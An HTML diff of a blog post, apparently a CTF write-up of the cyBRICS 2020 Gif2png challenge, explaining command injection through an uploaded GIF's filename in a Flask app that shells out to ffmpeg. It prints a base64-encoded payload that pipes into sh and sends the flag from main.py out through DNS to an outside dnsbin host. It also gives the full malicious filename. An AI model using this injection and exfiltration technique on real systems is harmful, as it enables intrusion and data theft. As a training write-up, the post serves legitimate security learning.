@@ -1,0 +1,468 @@
+<!doctype html>
+<html lang="en">
+<head>
+  <meta charset="utf-8">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  <title>nullarmor | cyBRICS CTF 2020 - Gif2png</title>
+  <meta name="description" content="Resolution of the cyBRICS CTF challenge named Gif2png">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+
+  <meta property="og:title" content="cyBRICS CTF 2020 - Gif2png">
+  <meta property="og:type" content="website">
+  <meta property="og:url" content="https://nullarmor.github.io/posts/cybrics-gif2png">
+  <meta property="og:description" content="Resolution of the cyBRICS CTF challenge named Gif2png">
+  <meta property="og:site_name" content="nullarmor">
+
+  <meta name="twitter:card" content="summary">
+  <meta name="twitter:url" content="https://nullarmor.github.io/posts/cybrics-gif2png">
+  <meta name="twitter:title" content="cyBRICS CTF 2020 - Gif2png">
+  <meta name="twitter:description" content="Resolution of the cyBRICS CTF challenge named Gif2png">
+  <meta name="google-site-verification" content="1sfOj2zDu7c444806MBQqbqFzNWxik880zgryQLMj-o" />
+
+  
+    
+      <meta property="og:image" content="https://nullarmor.github.io/assets/ctf/cybrics/2020/gif2png/gif2png-00-0ede9e305950712e679e89bb1e99939bceb88e58ae733ccf1047f6dba0e458fb.jpg">
+      <meta name="twitter:image" content="https://nullarmor.github.io/assets/ctf/cybrics/2020/gif2png/gif2png-00-0ede9e305950712e679e89bb1e99939bceb88e58ae733ccf1047f6dba0e458fb.jpg">
+    
+  
+
+  <link href="https://nullarmor.github.io/feed.xml" type="application/rss+xml" rel="alternate" title="nullarmor Last 10 blog posts" />
+
+  
+
+  
+
+    
+      <link rel="icon" type="image/x-icon" href="/assets/favicon-5df081ea197cddd592e345971da85e359e2f613dae2506c368835a695a297f82.gif">
+      <link rel="apple-touch-icon" href="/assets/favicon-5df081ea197cddd592e345971da85e359e2f613dae2506c368835a695a297f82.gif">
+      <link rel="stylesheet" type="text/css" title="light" id="light" href="/assets/light-fd3e34295723b96a04f635903b3650e5bb101ebdcc4d959165c3b4d2d88abe5e.css">
+      <link rel="stylesheet" type="text/css" title="dark" id="dark" href="/assets/dark-0f2545b8bdef934d32dd563b17074c614e7f4f4d5c3e682d4089a07fed36aa84.css" disabled="false">
+    
+
+  
+
+</head>
+
+<body>
+  <main>
+    <div class="grid grid-centered">
+      <div class="grid-cell">
+        <nav class="header-nav scrollappear">
+  <a href="/" class="header-logo" title="nullarmor">nullarmor</a>
+  <ul class="header-links">
+    
+      <li>
+        <a href="/about" title="About me">
+          <svg xmlns="http://www.w3.org/2000/svg" class="icon-about">
+  <use href="/assets/about-ecf154b571ab8034ae00aeed91a3b7ad68db80b46d958753ad6216c919486e88.svg#icon-about" xlink:href="/assets/about-ecf154b571ab8034ae00aeed91a3b7ad68db80b46d958753ad6216c919486e88.svg#icon-about"></use>
+</svg>
+
+        </a>
+      </li>
+    
+    
+      <li>
+        <a href="https://twitter.com/nullarmor" rel="noreferrer noopener" target="_blank" title="Twitter">
+          <svg xmlns="http://www.w3.org/2000/svg" class="icon-twitter">
+  <use href="/assets/twitter-8842c33965263ad1b03a978406826677a668f94125d5837e70ab83f24b3213a7.svg#icon-twitter" xlink:href="/assets/twitter-8842c33965263ad1b03a978406826677a668f94125d5837e70ab83f24b3213a7.svg#icon-twitter"></use>
+</svg>
+
+        </a>
+      </li>
+    
+    
+    
+    
+      <li>
+        <a href="https://github.com/nullarmor" rel="noreferrer noopener" target="_blank" title="GitHub">
+          <svg xmlns="http://www.w3.org/2000/svg" class="icon-github">
+  <use href="/assets/github-094f81040819f34343ee6ffff0980f17e2807b08b595eaaf66ae3554934fd78d.svg#icon-github" xlink:href="/assets/github-094f81040819f34343ee6ffff0980f17e2807b08b595eaaf66ae3554934fd78d.svg#icon-github"></use>
+</svg>
+
+        </a>
+      </li>
+    
+    
+    
+    
+    
+    
+    
+      <li>
+        <a href="https://www.linkedin.com/in/renan-almeida-8137a81a6" rel="noreferrer noopener" target="_blank" title="LinkedIn">
+          <svg xmlns="http://www.w3.org/2000/svg" class="icon-linkedin">
+  <use href="/assets/linkedin-cdc5c107044324a3dfbea2e9ead15873f8dee304c37d73a046988956b706256e.svg#icon-linkedin" xlink:href="/assets/linkedin-cdc5c107044324a3dfbea2e9ead15873f8dee304c37d73a046988956b706256e.svg#icon-linkedin"></use>
+</svg>
+
+        </a>
+      </li>
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+      <li>
+        <a href="mailto:nullarmor@protonmail.com" title="Email">
+          <svg xmlns="http://www.w3.org/2000/svg" class="icon-email">
+  <use href="/assets/email-782473193bf750036fdb90e8daa075508a20509d01854c09f3237c144a3f0601.svg#icon-email" xlink:href="/assets/email-782473193bf750036fdb90e8daa075508a20509d01854c09f3237c144a3f0601.svg#icon-email"></use>
+</svg>
+
+        </a>
+      </li>
+    
+    
+    
+      <li>
+        <a onclick="toggle()" title="Toggle Theme">
+          <svg xmlns="http://www.w3.org/2000/svg" class="icon-theme">
+  <use href="/assets/theme-66869e0bf8dab34bae1c86bda400327b772e0be69e8dc28d3ede896e771320ed.svg#icon-theme" xlink:href="/assets/theme-66869e0bf8dab34bae1c86bda400327b772e0be69e8dc28d3ede896e771320ed.svg#icon-theme"></use>
+</svg>
+
+        </a>
+      </li>
+    
+  </ul>
+</nav>
+
+
+  <ul class="header-tags scrollappear">
+    
+    
+      
+        <li><a href="/tag/ctf">Ctf</a></li>
+    
+      
+        <li><a href="/tag/cybrics">Cybrics</a></li>
+    
+      
+        <li><a href="/tag/hackthebox">Hackthebox</a></li>
+    
+      
+        <li><a href="/tag/hacktivitycon">Hacktivitycon</a></li>
+    
+      
+        <li><a href="/tag/pwn">Pwn</a></li>
+    
+      
+        <li><a href="/tag/rev">Rev</a></li>
+    
+      
+        <li><a href="/tag/rgbctf">Rgbctf</a></li>
+    
+      
+        <li><a href="/tag/web">Web</a></li>
+    
+  </ul>
+
+
+        <article class="article scrollappear">
+          <header class="article-header">
+            <h1>cyBRICS CTF 2020 - Gif2png</h1>
+            <p>Resolution of the cyBRICS CTF challenge named Gif2png</p>
+            <div class="article-list-footer">
+  <span class="article-list-date">
+    July 26, 2020
+  </span>
+  <span class="article-list-divider">-</span>
+  <span class="article-list-minutes">
+    
+    
+      7 minute read
+    
+  </span>
+  <span class="article-list-divider">-</span>
+  <div class="article-list-tags">
+    
+      
+      <a href="/tag/ctf" title="See all posts with tag 'Ctf'">Ctf</a>
+    
+      
+      <a href="/tag/web" title="See all posts with tag 'Web'">Web</a>
+    
+      
+      <a href="/tag/cybrics" title="See all posts with tag 'cyBRICS'">cyBRICS</a>
+    
+  </div>
+</div>
+          </header>
+
+          <div class="article-content">
+            <p><a href="/assets/ctf/cybrics/2020/gif2png/gif2png-00-0ede9e305950712e679e89bb1e99939bceb88e58ae733ccf1047f6dba0e458fb.jpg">
+  <img src="/assets/ctf/cybrics/2020/gif2png/gif2png-00-0ede9e305950712e679e89bb1e99939bceb88e58ae733ccf1047f6dba0e458fb.jpg" alt="CTF Challenge Banner" class="zooming" data-rjs="/assets/ctf/cybrics/2020/gif2png/gif2png-00-0ede9e305950712e679e89bb1e99939bceb88e58ae733ccf1047f6dba0e458fb.jpg" data-zooming-width="598" data-zooming-height="380" />
+</a></p>
+
+<p>Gif2Png is an easy web challenge from <code class="highlighter-rouge">cyBRICS CTF 2020</code>, an interesting web challenge that teaches you <code class="highlighter-rouge">command injection</code> through image’s filename.</p>
+
+<p>The challenge had the following description/details:</p>
+
+<p><a href="/assets/ctf/cybrics/2020/gif2png/gif2png-01-19a95b1d764ce4a33d90e54c311910ba49d3443274d8c46e9a2048f20a87b2fc.png">
+  <img src="/assets/ctf/cybrics/2020/gif2png/gif2png-01-19a95b1d764ce4a33d90e54c311910ba49d3443274d8c46e9a2048f20a87b2fc.png" alt="CTF Challenge Description" class="zooming" data-rjs="/assets/ctf/cybrics/2020/gif2png/gif2png-01-19a95b1d764ce4a33d90e54c311910ba49d3443274d8c46e9a2048f20a87b2fc.png" data-zooming-width="1188" data-zooming-height="237" />
+</a></p>
+
+<p>A copy of the original web application’s source code is available on: <a href="https://mega.nz/file/oMJnVAbR#qkUfgCsgjhkueLh9dOeKc_7Pm1BXzwacspLZxjvLB5Q">gif2png.tar.gz</a></p>
+
+<p>The challenge web page:</p>
+
+<p><a href="/assets/ctf/cybrics/2020/gif2png/gif2png-02-bca1ccb08ee990ca148bb270822bcfd4eb521cf5b3954a923b153bb83e05be4c.png">
+  <img src="/assets/ctf/cybrics/2020/gif2png/gif2png-02-bca1ccb08ee990ca148bb270822bcfd4eb521cf5b3954a923b153bb83e05be4c.png" alt="CTF Challenge Web Page" class="zooming" data-rjs="/assets/ctf/cybrics/2020/gif2png/gif2png-02-bca1ccb08ee990ca148bb270822bcfd4eb521cf5b3954a923b153bb83e05be4c.png" data-zooming-width="1292" data-zooming-height="715" />
+</a></p>
+
+<p>It seems that the web application slices the gif into frames and display them on the screen:</p>
+
+<p><a href="/assets/ctf/cybrics/2020/gif2png/gif2png-03-f19871cac5a882c348b311abdaaa4f860eb0fb5fc2fd43149313ba7c4d3ea066.png">
+  <img src="/assets/ctf/cybrics/2020/gif2png/gif2png-03-f19871cac5a882c348b311abdaaa4f860eb0fb5fc2fd43149313ba7c4d3ea066.png" alt="CTF Challenge Web Page" class="zooming" data-rjs="/assets/ctf/cybrics/2020/gif2png/gif2png-03-f19871cac5a882c348b311abdaaa4f860eb0fb5fc2fd43149313ba7c4d3ea066.png" data-zooming-width="1381" data-zooming-height="927" />
+</a></p>
+
+<p>So now let’s check the source code of the web application to understand how it is done.</p>
+
+<p>This is the source code of the main file, named <code class="highlighter-rouge">main.py</code>:</p>
+
+<figure class="highlight"><pre><code class="language-python" data-lang="python"><span class="kn">import</span> <span class="nn">logging</span>
+<span class="kn">import</span> <span class="nn">re</span>
+<span class="kn">import</span> <span class="nn">subprocess</span>
+<span class="kn">import</span> <span class="nn">uuid</span>
+<span class="kn">from</span> <span class="nn">pathlib</span> <span class="kn">import</span> <span class="n">Path</span>
+
+<span class="kn">from</span> <span class="nn">flask</span> <span class="kn">import</span> <span class="n">Flask</span><span class="p">,</span> <span class="n">render_template</span><span class="p">,</span> <span class="n">request</span><span class="p">,</span> <span class="n">redirect</span><span class="p">,</span> <span class="n">url_for</span><span class="p">,</span> <span class="n">flash</span><span class="p">,</span> <span class="n">send_from_directory</span>
+<span class="kn">from</span> <span class="nn">flask_bootstrap</span> <span class="kn">import</span> <span class="n">Bootstrap</span>
+<span class="kn">import</span> <span class="nn">os</span>
+<span class="kn">from</span> <span class="nn">werkzeug.utils</span> <span class="kn">import</span> <span class="n">secure_filename</span>
+<span class="kn">import</span> <span class="nn">filetype</span>
+
+
+<span class="n">ALLOWED_EXTENSIONS</span> <span class="o">=</span> <span class="p">{</span><span class="s">'gif'</span><span class="p">}</span>
+
+<span class="n">app</span> <span class="o">=</span> <span class="n">Flask</span><span class="p">(</span><span class="n">__name__</span><span class="p">)</span>
+<span class="n">app</span><span class="p">.</span><span class="n">config</span><span class="p">[</span><span class="s">'UPLOAD_FOLDER'</span><span class="p">]</span> <span class="o">=</span> <span class="s">'./uploads'</span>
+<span class="n">app</span><span class="p">.</span><span class="n">config</span><span class="p">[</span><span class="s">'SECRET_KEY'</span><span class="p">]</span> <span class="o">=</span> <span class="s">'********************************'</span>
+<span class="n">app</span><span class="p">.</span><span class="n">config</span><span class="p">[</span><span class="s">'MAX_CONTENT_LENGTH'</span><span class="p">]</span> <span class="o">=</span> <span class="mi">500</span> <span class="o">*</span> <span class="mi">1024</span>  <span class="c1"># 500Kb
+</span><span class="n">ffLaG</span> <span class="o">=</span> <span class="s">"cybrics{********************************}"</span>
+<span class="n">Bootstrap</span><span class="p">(</span><span class="n">app</span><span class="p">)</span>
+<span class="n">logging</span><span class="p">.</span><span class="n">getLogger</span><span class="p">().</span><span class="n">setLevel</span><span class="p">(</span><span class="n">logging</span><span class="p">.</span><span class="n">DEBUG</span><span class="p">)</span>
+
+<span class="k">def</span> <span class="nf">allowed_file</span><span class="p">(</span><span class="n">filename</span><span class="p">):</span>
+    <span class="k">return</span> <span class="s">'.'</span> <span class="ow">in</span> <span class="n">filename</span> <span class="ow">and</span> <span class="n">filename</span><span class="p">.</span><span class="n">rsplit</span><span class="p">(</span><span class="s">'.'</span><span class="p">,</span> <span class="mi">1</span><span class="p">)[</span><span class="mi">1</span><span class="p">].</span><span class="n">lower</span><span class="p">()</span> <span class="ow">in</span> <span class="n">ALLOWED_EXTENSIONS</span>
+
+
+<span class="o">@</span><span class="n">app</span><span class="p">.</span><span class="n">route</span><span class="p">(</span><span class="s">'/'</span><span class="p">,</span> <span class="n">methods</span><span class="o">=</span><span class="p">[</span><span class="s">'GET'</span><span class="p">,</span> <span class="s">'POST'</span><span class="p">])</span>
+<span class="k">def</span> <span class="nf">upload_file</span><span class="p">():</span>
+    <span class="n">logging</span><span class="p">.</span><span class="n">debug</span><span class="p">(</span><span class="n">request</span><span class="p">.</span><span class="n">headers</span><span class="p">)</span>
+    <span class="k">if</span> <span class="n">request</span><span class="p">.</span><span class="n">method</span> <span class="o">==</span> <span class="s">'POST'</span><span class="p">:</span>
+        <span class="k">if</span> <span class="s">'file'</span> <span class="ow">not</span> <span class="ow">in</span> <span class="n">request</span><span class="p">.</span><span class="n">files</span><span class="p">:</span>
+            <span class="n">logging</span><span class="p">.</span><span class="n">debug</span><span class="p">(</span><span class="s">'No file part'</span><span class="p">)</span>
+            <span class="n">flash</span><span class="p">(</span><span class="s">'No file part'</span><span class="p">,</span> <span class="s">'danger'</span><span class="p">)</span>
+            <span class="k">return</span> <span class="n">redirect</span><span class="p">(</span><span class="n">request</span><span class="p">.</span><span class="n">url</span><span class="p">)</span>
+
+        <span class="nb">file</span> <span class="o">=</span> <span class="n">request</span><span class="p">.</span><span class="n">files</span><span class="p">[</span><span class="s">'file'</span><span class="p">]</span>
+        <span class="k">if</span> <span class="nb">file</span><span class="p">.</span><span class="n">filename</span> <span class="o">==</span> <span class="s">''</span><span class="p">:</span>
+            <span class="n">logging</span><span class="p">.</span><span class="n">debug</span><span class="p">(</span><span class="s">'No selected file'</span><span class="p">)</span>
+            <span class="n">flash</span><span class="p">(</span><span class="s">'No selected file'</span><span class="p">,</span> <span class="s">'danger'</span><span class="p">)</span>
+            <span class="k">return</span> <span class="n">redirect</span><span class="p">(</span><span class="n">request</span><span class="p">.</span><span class="n">url</span><span class="p">)</span>
+
+        <span class="k">if</span> <span class="ow">not</span> <span class="n">allowed_file</span><span class="p">(</span><span class="nb">file</span><span class="p">.</span><span class="n">filename</span><span class="p">):</span>
+            <span class="n">logging</span><span class="p">.</span><span class="n">debug</span><span class="p">(</span><span class="s">f'Invalid file extension of file: </span><span class="si">{</span><span class="nb">file</span><span class="p">.</span><span class="n">filename</span><span class="si">}</span><span class="s">'</span><span class="p">)</span>
+            <span class="n">flash</span><span class="p">(</span><span class="s">'Invalid file extension'</span><span class="p">,</span> <span class="s">'danger'</span><span class="p">)</span>
+            <span class="k">return</span> <span class="n">redirect</span><span class="p">(</span><span class="n">request</span><span class="p">.</span><span class="n">url</span><span class="p">)</span>
+
+        <span class="k">if</span> <span class="nb">file</span><span class="p">.</span><span class="n">content_type</span> <span class="o">!=</span> <span class="s">"image/gif"</span><span class="p">:</span>
+            <span class="n">logging</span><span class="p">.</span><span class="n">debug</span><span class="p">(</span><span class="s">f'Invalid Content type: </span><span class="si">{</span><span class="nb">file</span><span class="p">.</span><span class="n">content_type</span><span class="si">}</span><span class="s">'</span><span class="p">)</span>
+            <span class="n">flash</span><span class="p">(</span><span class="s">'Content type is not "image/gif"'</span><span class="p">,</span> <span class="s">'danger'</span><span class="p">)</span>
+            <span class="k">return</span> <span class="n">redirect</span><span class="p">(</span><span class="n">request</span><span class="p">.</span><span class="n">url</span><span class="p">)</span>
+
+        <span class="k">if</span> <span class="ow">not</span> <span class="nb">bool</span><span class="p">(</span><span class="n">re</span><span class="p">.</span><span class="n">match</span><span class="p">(</span><span class="s">"^[a-zA-Z0-9_\-. '</span><span class="se">\"</span><span class="s">\=\$\(\)\|]*$"</span><span class="p">,</span> <span class="nb">file</span><span class="p">.</span><span class="n">filename</span><span class="p">))</span> <span class="ow">or</span> <span class="s">".."</span> <span class="ow">in</span> <span class="nb">file</span><span class="p">.</span><span class="n">filename</span><span class="p">:</span>
+            <span class="n">logging</span><span class="p">.</span><span class="n">debug</span><span class="p">(</span><span class="s">f'Invalid symbols in filename: </span><span class="si">{</span><span class="nb">file</span><span class="p">.</span><span class="n">content_type</span><span class="si">}</span><span class="s">'</span><span class="p">)</span>
+            <span class="n">flash</span><span class="p">(</span><span class="s">'Invalid filename'</span><span class="p">,</span> <span class="s">'danger'</span><span class="p">)</span>
+            <span class="k">return</span> <span class="n">redirect</span><span class="p">(</span><span class="n">request</span><span class="p">.</span><span class="n">url</span><span class="p">)</span>
+
+        <span class="k">if</span> <span class="nb">file</span> <span class="ow">and</span> <span class="n">allowed_file</span><span class="p">(</span><span class="nb">file</span><span class="p">.</span><span class="n">filename</span><span class="p">):</span>
+            <span class="n">filename</span> <span class="o">=</span> <span class="n">secure_filename</span><span class="p">(</span><span class="nb">file</span><span class="p">.</span><span class="n">filename</span><span class="p">)</span>
+            <span class="nb">file</span><span class="p">.</span><span class="n">save</span><span class="p">(</span><span class="n">os</span><span class="p">.</span><span class="n">path</span><span class="p">.</span><span class="n">join</span><span class="p">(</span><span class="n">app</span><span class="p">.</span><span class="n">config</span><span class="p">[</span><span class="s">'UPLOAD_FOLDER'</span><span class="p">],</span> <span class="nb">file</span><span class="p">.</span><span class="n">filename</span><span class="p">))</span>
+
+            <span class="n">mime_type</span> <span class="o">=</span> <span class="n">filetype</span><span class="p">.</span><span class="n">guess_mime</span><span class="p">(</span><span class="s">f'uploads/</span><span class="si">{</span><span class="nb">file</span><span class="p">.</span><span class="n">filename</span><span class="si">}</span><span class="s">'</span><span class="p">)</span>
+            <span class="k">if</span> <span class="n">mime_type</span> <span class="o">!=</span> <span class="s">"image/gif"</span><span class="p">:</span>
+                <span class="n">logging</span><span class="p">.</span><span class="n">debug</span><span class="p">(</span><span class="s">f'Invalid Mime type: </span><span class="si">{</span><span class="n">mime_type</span><span class="si">}</span><span class="s">'</span><span class="p">)</span>
+                <span class="n">flash</span><span class="p">(</span><span class="s">'Mime type is not "image/gif"'</span><span class="p">,</span> <span class="s">'danger'</span><span class="p">)</span>
+                <span class="k">return</span> <span class="n">redirect</span><span class="p">(</span><span class="n">request</span><span class="p">.</span><span class="n">url</span><span class="p">)</span>
+
+            <span class="n">uid</span> <span class="o">=</span> <span class="nb">str</span><span class="p">(</span><span class="n">uuid</span><span class="p">.</span><span class="n">uuid4</span><span class="p">())</span>
+            <span class="n">os</span><span class="p">.</span><span class="n">mkdir</span><span class="p">(</span><span class="s">f"uploads/</span><span class="si">{</span><span class="n">uid</span><span class="si">}</span><span class="s">"</span><span class="p">)</span>
+
+            <span class="n">logging</span><span class="p">.</span><span class="n">debug</span><span class="p">(</span><span class="s">f"Created: </span><span class="si">{</span><span class="n">uid</span><span class="si">}</span><span class="s">. Command: ffmpeg -i 'uploads/</span><span class="si">{</span><span class="nb">file</span><span class="p">.</span><span class="n">filename</span><span class="si">}</span><span class="s">' </span><span class="se">\"</span><span class="s">uploads/</span><span class="si">{</span><span class="n">uid</span><span class="si">}</span><span class="s">/%03d.png</span><span class="se">\"</span><span class="s">"</span><span class="p">)</span>
+
+            <span class="n">command</span> <span class="o">=</span> <span class="n">subprocess</span><span class="p">.</span><span class="n">Popen</span><span class="p">(</span><span class="s">f"ffmpeg -i 'uploads/</span><span class="si">{</span><span class="nb">file</span><span class="p">.</span><span class="n">filename</span><span class="si">}</span><span class="s">' </span><span class="se">\"</span><span class="s">uploads/</span><span class="si">{</span><span class="n">uid</span><span class="si">}</span><span class="s">/%03d.png</span><span class="se">\"</span><span class="s">"</span><span class="p">,</span> <span class="n">shell</span><span class="o">=</span><span class="bp">True</span><span class="p">)</span>
+            <span class="n">command</span><span class="p">.</span><span class="n">wait</span><span class="p">(</span><span class="n">timeout</span><span class="o">=</span><span class="mi">15</span><span class="p">)</span>
+            <span class="n">logging</span><span class="p">.</span><span class="n">debug</span><span class="p">(</span><span class="n">command</span><span class="p">.</span><span class="n">stdout</span><span class="p">)</span>
+
+            <span class="n">flash</span><span class="p">(</span><span class="s">'Successfully saved'</span><span class="p">,</span> <span class="s">'success'</span><span class="p">)</span>
+            <span class="k">return</span> <span class="n">redirect</span><span class="p">(</span><span class="n">url_for</span><span class="p">(</span><span class="s">'result'</span><span class="p">,</span> <span class="n">uid</span><span class="o">=</span><span class="n">uid</span><span class="p">))</span>
+
+    <span class="k">return</span> <span class="n">render_template</span><span class="p">(</span><span class="s">"form.html"</span><span class="p">)</span>
+
+
+<span class="o">@</span><span class="n">app</span><span class="p">.</span><span class="n">route</span><span class="p">(</span><span class="s">'/result/&lt;uid&gt;/'</span><span class="p">)</span>
+<span class="k">def</span> <span class="nf">result</span><span class="p">(</span><span class="n">uid</span><span class="p">):</span>
+    <span class="n">images</span> <span class="o">=</span> <span class="p">[]</span>
+    <span class="k">for</span> <span class="n">image</span> <span class="ow">in</span> <span class="n">os</span><span class="p">.</span><span class="n">listdir</span><span class="p">(</span><span class="s">f"uploads/</span><span class="si">{</span><span class="n">uid</span><span class="si">}</span><span class="s">"</span><span class="p">):</span>
+        <span class="n">mime_type</span> <span class="o">=</span> <span class="n">filetype</span><span class="p">.</span><span class="n">guess</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">Path</span><span class="p">(</span><span class="s">"uploads"</span><span class="p">)</span> <span class="o">/</span> <span class="n">uid</span> <span class="o">/</span> <span class="n">image</span><span class="p">))</span>
+        <span class="k">if</span> <span class="n">image</span><span class="p">.</span><span class="n">endswith</span><span class="p">(</span><span class="s">".png"</span><span class="p">)</span> <span class="ow">and</span> <span class="n">mime_type</span> <span class="ow">is</span> <span class="ow">not</span> <span class="bp">None</span> <span class="ow">and</span> <span class="n">mime_type</span><span class="p">.</span><span class="n">EXTENSION</span> <span class="o">==</span> <span class="s">"png"</span><span class="p">:</span>
+            <span class="n">images</span><span class="p">.</span><span class="n">append</span><span class="p">(</span><span class="n">image</span><span class="p">)</span>
+
+    <span class="k">return</span> <span class="n">render_template</span><span class="p">(</span><span class="s">"result.html"</span><span class="p">,</span> <span class="n">uid</span><span class="o">=</span><span class="n">uid</span><span class="p">,</span> <span class="n">images</span><span class="o">=</span><span class="n">images</span><span class="p">)</span>
+
+
+<span class="o">@</span><span class="n">app</span><span class="p">.</span><span class="n">route</span><span class="p">(</span><span class="s">'/uploads/&lt;uid&gt;/&lt;image&gt;'</span><span class="p">)</span>
+<span class="k">def</span> <span class="nf">image</span><span class="p">(</span><span class="n">uid</span><span class="p">,</span> <span class="n">image</span><span class="p">):</span>
+    <span class="n">logging</span><span class="p">.</span><span class="n">debug</span><span class="p">(</span><span class="n">request</span><span class="p">.</span><span class="n">headers</span><span class="p">)</span>
+    <span class="nb">dir</span> <span class="o">=</span> <span class="nb">str</span><span class="p">(</span><span class="n">Path</span><span class="p">(</span><span class="n">app</span><span class="p">.</span><span class="n">config</span><span class="p">[</span><span class="s">'UPLOAD_FOLDER'</span><span class="p">])</span> <span class="o">/</span> <span class="n">uid</span><span class="p">)</span>
+    <span class="k">return</span> <span class="n">send_from_directory</span><span class="p">(</span><span class="nb">dir</span><span class="p">,</span> <span class="n">image</span><span class="p">)</span>
+
+
+<span class="o">@</span><span class="n">app</span><span class="p">.</span><span class="n">errorhandler</span><span class="p">(</span><span class="mi">413</span><span class="p">)</span>
+<span class="k">def</span> <span class="nf">request_entity_too_large</span><span class="p">(</span><span class="n">error</span><span class="p">):</span>
+    <span class="k">return</span> <span class="s">"File is too large"</span><span class="p">,</span> <span class="mi">413</span>
+
+
+<span class="k">if</span> <span class="n">__name__</span> <span class="o">==</span> <span class="s">"__main__"</span><span class="p">:</span>
+    <span class="n">app</span><span class="p">.</span><span class="n">run</span><span class="p">(</span><span class="n">host</span><span class="o">=</span><span class="s">'localhost'</span><span class="p">,</span> <span class="n">port</span><span class="o">=</span><span class="mi">5000</span><span class="p">,</span> <span class="n">debug</span><span class="o">=</span><span class="bp">True</span><span class="p">,</span> <span class="n">threaded</span><span class="o">=</span><span class="bp">True</span><span class="p">)</span></code></pre></figure>
+
+<p>What caught my attention was the line 104:</p>
+
+<figure class="highlight"><pre><code class="language-python" data-lang="python"><span class="n">command</span> <span class="o">=</span> <span class="n">subprocess</span><span class="p">.</span><span class="n">Popen</span><span class="p">(</span><span class="s">f"ffmpeg -i 'uploads/</span><span class="si">{</span><span class="nb">file</span><span class="p">.</span><span class="n">filename</span><span class="si">}</span><span class="s">' </span><span class="se">\"</span><span class="s">uploads/</span><span class="si">{</span><span class="n">uid</span><span class="si">}</span><span class="s">/%03d.png</span><span class="se">\"</span><span class="s">"</span><span class="p">,</span> <span class="n">shell</span><span class="o">=</span><span class="bp">True</span><span class="p">)</span></code></pre></figure>
+
+<p>This can be very insecure because the web application is passing an user input to be executed as system command. (<code class="highlighter-rouge">file.filename</code>)</p>
+
+<p>There’s a small condition that checks for some characters on filename and blocks the upload:</p>
+
+<figure class="highlight"><pre><code class="language-python" data-lang="python"><span class="k">if</span> <span class="ow">not</span> <span class="nb">bool</span><span class="p">(</span><span class="n">re</span><span class="p">.</span><span class="n">match</span><span class="p">(</span><span class="s">"^[a-zA-Z0-9_\-. '</span><span class="se">\"</span><span class="s">\=\$\(\)\|]*$"</span><span class="p">,</span> <span class="nb">file</span><span class="p">.</span><span class="n">filename</span><span class="p">))</span> <span class="ow">or</span> <span class="s">".."</span> <span class="ow">in</span> <span class="nb">file</span><span class="p">.</span><span class="n">filename</span><span class="p">:</span>
+  <span class="n">logging</span><span class="p">.</span><span class="n">debug</span><span class="p">(</span><span class="s">f'Invalid symbols in filename: </span><span class="si">{</span><span class="nb">file</span><span class="p">.</span><span class="n">content_type</span><span class="si">}</span><span class="s">'</span><span class="p">)</span>
+  <span class="n">flash</span><span class="p">(</span><span class="s">'Invalid filename'</span><span class="p">,</span> <span class="s">'danger'</span><span class="p">)</span>
+  <span class="k">return</span> <span class="n">redirect</span><span class="p">(</span><span class="n">request</span><span class="p">.</span><span class="n">url</span><span class="p">)</span></code></pre></figure>
+
+<p>So now we need to exploit this weak point.</p>
+
+<p>The very first thing we need to do is stop the actual ffmpeg command and execute another one, to do this we need to escape the <code class="highlighter-rouge">'</code> quotes and append another command.</p>
+
+<p>I found a way to bypass the filename verification using double pipelines to execute my system command, the malicious filename will look something like this:</p>
+
+<blockquote>
+  <p><code class="highlighter-rouge">MALICIOUS_NAME'||MALICIOUS SYTEM COMMAND HERE||'</code></p>
+</blockquote>
+
+<figure class="highlight"><pre><code class="language-shell" data-lang="shell">ffmpeg <span class="nt">-i</span> <span class="s1">'uploads/MALICIOUS_NAME'</span><span class="o">||</span>MALICIOUS SYTEM COMMAND HERE||<span class="s1">' "uploads/{uid}/%03d.png\"</span></code></pre></figure>
+
+<p>There’s a final problem: how to inject system commands through filename and bypass the filename check? <code class="highlighter-rouge">Encoding the payload with base64, decoding and executing on the fly!</code></p>
+
+<blockquote>
+  <p><code class="highlighter-rouge">echo d2hvYW1pO2lkO3NsZWVwIDEw|base64 -d|sh</code></p>
+</blockquote>
+
+<p>Unfortunatelly, the challenge server had a firewall blocking reverse shells and requests to the external resources through port 80.
+So I came with the idea of exfiltrating the flag (inside the main.py) through DNS using <code class="highlighter-rouge">dnsbin.zhack.ca</code>:</p>
+
+<blockquote>
+  <p><code class="highlighter-rouge">flag=$(cat main.py|grep -wo cybrics{.*|base64|tr -d '=');curl $flag.a0325542a59398d0bda8.d.zhack.ca</code></p>
+</blockquote>
+
+<p>The flag is extracted from the main.py and sent through DNS using DNSBin, all we need to do is encode the above command as base64 and rename the file:</p>
+
+<p>The encoded payload:</p>
+
+<blockquote>
+  <p><code class="highlighter-rouge">ZmxhZz0kKGNhdCBtYWluLnB5fGdyZXAgLXdvIGN5YnJpY3N7Lip8YmFzZTY0fHRyIC1kICc9Jyk7Y3VybCAkZmxhZy5iNDQ1YzMwODAxYTg4OTRhMzc0Ny5kLnpoYWNrLmNh</code></p>
+</blockquote>
+
+<p>The 2nd part:</p>
+
+<blockquote>
+  <p><code class="highlighter-rouge">echo ZmxhZz0kKGNhdCBtYWluLnB5fGdyZXAgLXdvIGN5YnJpY3N7Lip8YmFzZTY0fHRyIC1kICc9Jyk7Y3VybCAkZmxhZy5iNDQ1YzMwODAxYTg4OTRhMzc0Ny5kLnpoYWNrLmNh|base64 -d|sh</code></p>
+</blockquote>
+
+<p>The final filename:</p>
+
+<blockquote>
+  <p><code class="highlighter-rouge">nullarmor'||echo ZmxhZz0kKGNhdCBtYWluLnB5fGdyZXAgLXdvIGN5YnJpY3N7Lip8YmFzZTY0fHRyIC1kICc9Jyk7Y3VybCAkZmxhZy5iNDQ1YzMwODAxYTg4OTRhMzc0Ny5kLnpoYWNrLmNh|base64 -d|sh||'.gif</code></p>
+</blockquote>
+
+<p>Now we just renamed a gif file with the malicious filename and uploaded it on the Gif2png web application!</p>
+
+<p><a href="/assets/ctf/cybrics/2020/gif2png/gif2png-04-bab35abb8f097541da9a97cabfe9d2c07e8434155e5fe0063f2e406835b4ff16.png">
